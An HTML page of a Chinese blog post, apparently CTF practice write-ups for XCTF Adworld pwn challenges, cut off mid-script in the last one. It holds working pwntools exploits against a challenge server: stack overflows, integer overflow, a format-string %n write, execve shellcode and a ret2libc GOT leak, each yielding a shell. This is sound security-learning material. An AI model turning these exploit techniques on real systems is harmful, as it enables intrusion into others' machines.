+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605161502591.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605161944323.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605163357042.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605203928195.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605221940761.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605222351181.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605222611543.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605224545388.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605225102222.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606091645885.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606153058583.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606155906601.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606172047471.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200607160312039.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200607160518598.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105006912.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105624424.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105703718.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609110724445.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610140544469.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610140847175.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610171656557.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610171941539.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610172311560.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610172459341.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200611162320998.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200611163417332.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200612101533939.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603151159958.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603151520348.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152007549.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152328450.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152657713.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605090406828.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605090938145.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605092003637.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608181103998.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608182629397.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608183049831.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608184738940.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605092808030-1591322466624.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605093020161.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095114997.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095231700.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095322038.png">
+<meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095503617.png">
+<meta property="article:published_time" content="2020-06-04T05:05:44.000Z">
+<meta property="article:modified_time" content="2021-08-08T02:54:56.913Z">
+<meta property="article:author" content="ooo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200604180206603.png">
+
+<link rel="canonical" href="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>pwn练习 | Bxb0's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Bxb0's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Bxb0's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">15</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">43</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ooo">
+      <meta itemprop="description" content="0x446e37fb">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bxb0's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn练习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-06-04 13:05:44" itemprop="dateCreated datePublished" datetime="2020-06-04T13:05:44+08:00">2020-06-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>10 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>pwn的一些练习记录~<a id="more"></a></p>
+<h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h2><h3 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h3><blockquote>
+<p>栈溢出</p>
+</blockquote>
+<p>ida打开看一下。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200604180206603.png" alt="image-20200604180206603"></p>
+<p>可以知道这个随机数种子我们是不知道的，但是可以直接通过gets(v7)，通过栈溢出把这个种子换成1，再用1计算出随机数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">46809</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span>*<span class="string">'a'</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">l = <span class="string">'2542625142'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">	p.recvuntil(<span class="string">'input'</span>)</span><br><span class="line">	p.sendline(i)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200604180443703.png" alt="image-20200604180443703"></p>
+<p><strong>总结：对栈更加熟悉。</strong></p>
+<h3 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h3><blockquote>
+<p>栈溢出，控制程序走向</p>
+</blockquote>
+<p> 使用checksec看一保护，没有canary。</p>
+<p> ida中看一下，gets()存在溢出，有system()函数，但是字符串不是我们想要的shell。和之前在论剑场做过的很像，只不过那个是64位，这个是32位，参数传递不同而已。</p>
+<p>  <img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605123722286.png" alt="image-20200605123722286"></p>
+<p> 尝试使用 ROPgadget搜索<strong>$0</strong>,无果。但回到程序看到有一个全局变量让我们输入name，那就自己构造。</p>
+<p> 找到system的地址，写py脚本。</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">53127</span>)</span><br><span class="line">s = <span class="string">'$0'</span> <span class="comment">#这里也可以'/bin/sh'</span></span><br><span class="line">p.recvuntil(<span class="string">'name'</span>)</span><br><span class="line">p.sendline(s)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x26</span>+<span class="number">4</span>)*<span class="string">'a'</span> + p32(<span class="number">0x0804855A</span>) + p32(<span class="number">0x0804A080</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'here:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到shell。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605124200541.png" alt="image-20200605124200541"></p>
+<p><strong>总结：上次是64位，这次体验了32位程序，传参不同。</strong></p>
+<h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><blockquote>
+<p>栈溢出，整数溢出</p>
+</blockquote>
+<p>没有开启canary，在ida中可以看到第一个login函数都不存在溢出。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605161502591.png" alt="image-20200605161502591"></p>
+<p>但从搜索的字符串找到引用，有一个system(“cat flag”)，所以还是考虑通过栈溢出控制程序走向。</p>
+<p>果然在<strong>check_passwd（&amp;buf）</strong>存在栈溢出，这里就是多了个整数溢出。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605161944323.png" alt="image-20200605161944323"></p>
+<p>由于一个字节无符号的范围（0-255），那我们最小只要260就可以让v3==4即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54696</span>)</span><br><span class="line">payload = (<span class="number">0x14</span>+<span class="number">4</span>)*<span class="string">'a'</span> + p32(<span class="number">0x08048694</span>) + (<span class="number">260</span><span class="number">-28</span>)*<span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'username:'</span>)</span><br><span class="line">p.sendline(<span class="string">'Bnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'passwd:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605163357042.png" alt="image-20200605163357042"></p>
+<p><strong>总结：对整数溢出有了了解。</strong></p>
+<h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><blockquote>
+<p>格式化字符换漏洞，写入shellcode。但是有很多逻辑干扰，关键还是分析到强制转化为函数到执行，联系到执行自己的shellcode。</p>
+</blockquote>
+<p>程序除了基址随机化保护关了，其他全开。</p>
+<p>载入ida找漏洞，感觉有点复杂，一个小游戏，函数有点多。但是由于没有关键字符串与system（）函数，这时候就可以往写shellcode方面想。果然在<strong>sub_400CA6((_DWORD *)a1);</strong>中找到了。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605203928195.png" alt="image-20200605203928195"></p>
+<p>但要使整个函数执行，上面有个判断，<strong>*a1 == a1[1]</strong>，寻找*a1的参数来源，可以知道使main()函数里的v4。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605221940761.png" alt="image-20200605221940761"></p>
+<p>这时候看有没有地方可以让着2个数相等。还有2个关键函数仔细看的。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605222351181.png" alt="image-20200605222351181"></p>
+<p>进入<strong>sub_400A7D()</strong>，直接输入east跳过就好了。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605222611543.png" alt="image-20200605222611543"></p>
+<p>再看<strong>sub_400BB9()</strong>,正好这里有这个漏洞，且有提示信息。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605224545388.png" alt="image-20200605224545388"></p>
+<p>下面用gdb调试看看v2的值在第几个参数位置。在printf()处下断点。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605225102222.png" alt="image-20200605225102222"></p>
+<p>但是注意这是64位程序，先是使用6个寄存器传递参数（rdi, rsi, rdx, rcx, r8, r9）,而这里<strong>rdi</strong>作为了格式化字符串的参数，那寄存器还有5个用来传递参数，那我们的改变地址的值就是第(5+2) = 7个参数了。</p>
+<p>开始写脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug' 这个可以将每一步的调试信息反馈给用户。</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">46461</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">addr = int(p.recv(<span class="number">7</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name be:'</span>)</span><br><span class="line">p.sendline(<span class="string">'Bnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'east or up?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'east'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'leave(0)?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"address'"</span>)</span><br><span class="line">p.sendline(str(addr))</span><br><span class="line">p.recvuntil(<span class="string">'wish is:'</span>)</span><br><span class="line">p.sendline(<span class="string">'%085d%7$n'</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>) <span class="comment">#这里shellcode的2中写法。</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#shellcode="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line">p.recvuntil(<span class="string">'YOU SPELL'</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606091645885.png" alt="image-20200606091645885"></p>
+<p><strong>总结：1.shellcode的写法：一：通过shellcraft 一个生成shellcode的类。shellcraft.sh()获得执行system(“/bin/sh”)汇编代码所对应的机器码。二：通过反汇编的shellcode代码。2.对格式化字符串漏洞及64位传参加深了理解。3.分析长的题目。</strong></p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><blockquote>
+<p>开始查保护后没注意到NX，在栈上几次没执行成功才回去看到。这个题实际还是栈溢出，但多考了很多知识点，对刚接触pwn收获还是很大。</p>
+</blockquote>
+<p>首先查保护，只开了NX，没有canary，那就可以往靠溢出控制程序走向了的方向看题。</p>
+<p>载入ida后，栈溢出很明显。</p>
+<p> <img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606153058583.png" alt="image-20200606153058583"></p>
+<p>但利用起来，既没有有system函数，也没有’/bin/sh’。这对于刚接触pwn还是比较困难的，但本来就学习的过程，看了writeup又去学了下.plt与.got再来做的题。</p>
+<p>其实程序带了一个运行库的，里面有动态链接库的函数及一些其他信息。既然程序里没有自然就利用这个运行库了，根据elf文件与pe文件类似，各个函数与数据的相对地址是不变的。利用这一点与我们在程序中是调用了write与read动态库函数的，随便选择一个得到他们的地址，再根据相对地址相加减就得到我们要的函数与数据（system()与‘/bin/sh’）的地址了。</p>
+<p>首先计算在运行库里的的read函数与system函数的相对地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sys_cha = hex(lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'read'</span>])</span><br></pre></td></tr></table></figure>
+
+<p>计算运行库中read函数与 ‘/bin/sh’的相对地址。先找到 ’/bin/sh’的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc_32.so<span class="number">.6</span> --string <span class="string">'/bin/sh'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606155906601.png" alt="image-20200606155906601"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">bin_cha = hex(<span class="number">0x0015902b</span>-lib.symbols[<span class="string">'read'</span>])</span><br></pre></td></tr></table></figure>
+
+<p>有 a-b=c，现在我们有了c，只需通过程序溢出就可以找到b, 最后通 a = b+c得到我们要的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54407</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(elf.plt[<span class="string">'write'</span>])+p32(elf.symbols[<span class="string">'main'</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'read'</span>])+p32(<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv()[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure>
+
+<p>将各部分结合起来，脚本攻击。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54407</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(elf.plt[<span class="string">'write'</span>])+p32(elf.symbols[<span class="string">'main'</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'read'</span>])+p32(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">bin_cha = int(<span class="number">0x0015902b</span>-lib.symbols[<span class="string">'read'</span>])</span><br><span class="line">bin_addr = read_addr + bin_cha</span><br><span class="line"></span><br><span class="line">sys_cha = int(lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'read'</span>])</span><br><span class="line">sys_addr = read_addr + sys_cha</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload1 = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(sys_addr)+p32(<span class="number">1</span>)+p32(bin_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606172047471.png" alt="image-20200606172047471"></p>
+<p><strong>总结：1.u32()相当于p32()的逆运算。2.ELF的各种使用。3.对.plt与.got的学习。4. 从运行库寻找所要函数与数据。5.这道题对于刚接触pwn的来做，可做性很高。</strong></p>
+<h3 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h3><blockquote>
+<p>上之前做的 guess_game 一个道理。通过栈溢出，改变程序特定的值。</p>
+</blockquote>
+<p>查保护没有 canary，这也算是引导了，因为是做题。</p>
+<p>ida中看一下。就是随机数种子精确到了秒，所以直接通过栈溢出改变种子的值。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200607160312039.png" alt="image-20200607160312039"></p>
+<p>写脚本攻击。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">43642</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x50</span><span class="number">-0x10</span>)*<span class="string">'a'</span> + p64(<span 